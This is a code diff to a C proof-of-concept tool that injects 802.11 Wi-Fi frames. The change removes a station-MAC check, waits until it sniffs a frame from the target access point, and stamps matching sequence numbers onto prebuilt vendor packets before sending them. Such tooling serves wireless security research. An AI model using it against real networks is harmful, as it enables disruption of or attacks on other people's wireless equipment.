@@ -133,9 +133,10 @@ unsigned char get_target(struct poc_options *popt) {
             break;
         }
 
-        if(MAC_MATCHES(bssid, popt->ap_mac) && (MAC_MATCHES(smac, popt->sta_mac) || MAC_MATCHES(smac, popt->ap_mac)))
+        if(MAC_MATCHES(bssid, popt->ap_mac) && (/*MAC_MATCHES(smac, popt->sta_mac) || */MAC_MATCHES(smac, popt->ap_mac)))
         {
             set_seqno(NULL, get_seqno(&sniffed));
+            ret = 1;
             break;
         }
     }
@@ -162,7 +163,7 @@ void dumphex(uint8_t *data, uint32_t length)
 struct packet poc_getpacket(void *options) {
     struct poc_options *popt = (struct poc_options *) options;
     struct packet pkt = {0};
-    struct ieee_hdr *hdr;
+    struct ieee_hdr *hdr, *hdr1;
     uint16_t next_seqno = 0;
 	uint8_t dsflags;
     static int vendor_idx=-1, pkt_idx=0;
@@ -229,17 +230,21 @@ struct packet poc_getpacket(void *options) {
                     break;
                 }
 
-                if(hdr->type == IEEE80211_TYPE_BEACON)
-                {
-                    memcpy(hdr->addr1.ether_addr_octet, BROADCAST, ETHER_ADDR_LEN);
-                }
-
-                if((hdr->type & 0x0F) != 0x04)
-                {
-                    set_seqno(&poc_pkts[vendor_idx].pkts[pkt_idx], get_next_seqno());
-                }
-
                 pkt = poc_pkts[vendor_idx].pkts[pkt_idx];
+                hdr1 = (struct ieee_hdr *)pkt.data;
+
+                if(hdr1->type == IEEE80211_TYPE_BEACON)
+                {
+                    memcpy(hdr1->addr1.ether_addr_octet, BROADCAST, ETHER_ADDR_LEN);
+                }
+
+                while(!get_target(popt));
+
+                if((hdr1->type & 0x0F) != 0x04)
+                {
+                    next_seqno = get_next_seqno();
+                    set_seqno(&pkt, next_seqno);
+                }
 
                 pkt_idx++;
 
